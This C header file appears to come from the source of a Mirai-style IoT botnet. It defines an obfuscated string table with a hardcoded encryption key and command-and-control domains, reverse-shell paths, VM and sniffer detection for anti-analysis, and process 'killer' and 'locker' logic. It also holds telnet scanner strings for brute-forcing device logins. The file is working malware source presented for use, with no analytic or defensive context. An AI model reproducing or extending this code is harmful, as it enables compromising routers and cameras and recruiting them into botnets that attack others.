#ifndef TABLE_H
#define TABLE_H

#include "bot/utils/tokenizer.h"
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

static const char *TEAX_KEY = "PJbiNbbeasddDfsc";

enum {
  TABLE_EXEC_MESSAGE, // System upgrade in progress...

  /* == Basic Bot Config == */
  TABLE_STUN_DOMAIN,    // stun.l.google.com
  TABLE_CNC_DOMAIN,     // dvrxpert.tiananmensquare1989.su OR busybox.whoasked.su
  TABLE_SELFREP_DOMAIN, // report.tiananmensquare1989.su
  TABLE_PROC_NAMES,     // telnetd,udhcpc,inetd,ntpclient,watchdog,klogd,upnpd,dhclient
  TABLE_REVERSE_SHELL,  // /bin/sh,/bin/bash,/system/bin/sh,/system/xbin/sh
  TABLE_MAPPER_LIB,     // /lib/
  TABLE_MAPPER_NAME,    // libcow.so

  /* == Network Config == */
  TABLE_SYS_CLASS_NET, // /sys/class/net/
  TABLE_ADDRESS,       // /address
  TABLE_FLAGS,         // /flags
  TABLE_CARRIER,       // /carrier

  /* == Anti Debug Config == */
  TABLE_ADBG_FILES, // /sys/class/dmi/id/product_name,/sys/class/dmi/id/sys_vendor,/sys/class/dmi/id/board_vendor
  TABLE_ADBG_INDICATORS, // VMware,VirtualBox,KVM,Microsoft,QEMU
  TABLE_ADBG_SNIFFERS,   // tcpdump,wireshark,tshark,dumpcap

  /* == Killer Config == */
  TABLE_KILLER_PROC,      // /proc/
  TABLE_KILLER_MOUNTS,    // /proc/mounts
  TABLE_KILLER_MOUNTINFO, // /proc/self/mountinfo
  TABLE_KILLER_SELF_EXE,  // /proc/self/exe
  TABLE_KILLER_NET_TCP,   // /proc/net/tcp
  TABLE_KILLER_NET_UNIX,  // /proc/net/unix
  TABLE_OOM_SCORE_ADJ,    // /proc/self/oom_score_adj
  TABLE_OOM_SCORE,        // -1000

  TABLE_KILLER_CMDLINE, // /cmdline
  TABLE_KILLER_STATUS,  // /status
  TABLE_KILLER_MAPS,    // /maps
  TABLE_KILLER_STAT,    // /stat
  TABLE_KILLER_EXE,     // /exe
  TABLE_KILLER_FD,      // /fd

  TABLE_KILLER_DELETED, // (deleted)
  TABLE_KILLER_PPID,    // PPid:
  TABLE_KILLER_TMP,     // /tmp/,/var/tmp/,/root/,/dev/shm/,/mnt/

  TABLE_LOCKER_BLACKLIST, // wget,curl,tftp,ftp,mount,chmod,socat,echo
  TABLE_LOCKER_LOGIN,     // login\0
  TABLE_LOCKER_SH,        // sh\0
  TABLE_KILLER_DEV,       // /dev/

  /* == Base64 Library == */
  TABLE_BASE64,

  /* == Speedtest Library == */
  SPEEDTEST_SERVERLIST_DOMAIN, // c.speedtest.net

  // GET /speedtest-servers-static.php HTTP/1.1\r\nHost: c.speedtest.net\r\nConnection:
  // close\r\nUser-Agent: speedtest-cli\r\n\r\n
  SPEEDTEST_SERVERLIST_REQUEST,

  // GET /speedtest/latency.txt HTTP/1.1\r\nHost: ?\r\nConnection: close\r\nUser-Agent:
  // speedtest-cli\r\n\r\n
  SPEEDTEST_LATENCY_REQUEST,

  // POST ? HTTP/1.1\r\nHost: ?\r\nUser-Agent: speedtest-cli\r\nContent-Type:
  // application/octet-stream\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n
  SPEEDTEST_UPLOAD_REQUEST,

  SPEEDTEST_URL, // url=

  /* == Banner Scanner Config == */
  TABLE_BANNER_REQUEST,

  /* == Telnet Scanner Config == */
  // ogin,enter
  TABLE_SCANNER_USER,
  // assword
  TABLE_SCANNER_PASSWORD,
  // o Service response,ncorrect,uthentication fail,ogin invalid,ad password,ccess denied
  TABLE_SCANNER_FAIL,
  // /bin/busybox HISILICON
  TABLE_SCANNER_QUERY,
  // HISILICON: applet not found
  TABLE_SCANNER_QUERY_RESP,
  // acl IP:
  TABLE_SCANNER_FTTH,
  // to telnet
  TABLE_SCANNER_FTTH_RESP,

  TABLE_MAX_IDS,
};

typedef struct {
  char *data;
  uint16_t len;
  bool locked;
} table_value_t, *ptable_value_t;

extern ptable_value_t table;

void table_init();
void table_lock(uint8_t id);

const char *table_retrieve(uint8_t id, size_t *len);
ptable_value_t table_retrieve_value(uint8_t id);
ptokenizer_t table_retrieve_list(uint8_t id);

#endif
